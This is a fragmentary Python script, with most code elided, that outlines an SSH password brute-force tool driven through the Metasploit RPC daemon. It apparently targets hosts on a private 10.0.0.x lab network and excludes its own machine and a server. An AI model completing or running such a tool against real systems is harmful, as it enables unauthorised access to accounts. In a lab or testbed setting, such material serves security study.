...
def ssh_brute_force(target_every_machines, attack_type):
    ...
    # we avoid brute-forcing ourselves or the server
    if "10.0.0.2" in targets:
        targets.remove("10.0.0.2")

    if "10.0.0.1" in targets:
    ...
    if targets:
        if target_every_machines:
            crack_ssh_password(targets, attack_type)
        else:
            crack_ssh_password([targets[-1]], attack_type)
    else:
        print("No targets found")


def crack_ssh_password(targets, attack_type):
    if attack_type == 't':
    ...
    # we print the target/targets and record it to the log
    print('targets: ')
    ...
    for target in targets:
        ...
        try:
            ...
            sp.Popen('msfrpcd -P 10000', shell=True)
...
def main():
    ...
    parser.add_argument('-a', '--action', default='m', type=str)
    args = parser.parse_args()
    ssh_brute_force(args.distributed, args.action)
